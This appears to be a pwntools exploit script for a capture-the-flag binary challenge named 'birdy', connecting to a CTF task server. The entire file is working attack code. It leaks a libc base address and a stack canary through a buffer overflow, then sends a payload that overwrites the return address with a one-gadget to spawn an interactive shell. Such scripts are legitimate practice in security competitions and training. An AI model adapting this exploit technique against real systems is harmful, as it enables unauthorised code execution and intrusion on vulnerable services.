from pwn import *

context.binary = exe = ELF("./birdy_patched", checksec=False)
context.log_level = "debug"

#p = process()
p = remote("birdy.tasks.2025.ctf.cs.msu.ru", 25014)
p.recv()

p.sendline(b"1")

base = p.recvline()
base = base[-7:-1]
print(base)
base = u64(base.ljust(8, b"\x00")) - 2115008
one = base + 361436
#offset 0x2045C0 in hex
p.recv()

p.sendline(b"2")
p.recv()

p.sendline(b"73")
p.send(b"A" * 73)

p.recv()
p.sendline(b"1")

can = p.recvline()
can = can[-8:-1]

p.recv()
p.sendline(b"2")
p.recv()

p.sendline(b"144")
print(can)
#pid = util.proc.pidof(p)[0]
#print(pid)
#util.proc.wait_for_debugger(pid)
p.send(b"A" * 72 + p8(0) + can +b"A" * 8 +  p64(0) +  b"A" * 40 + p64(one))

p.sendline(b"3")

p.interactive()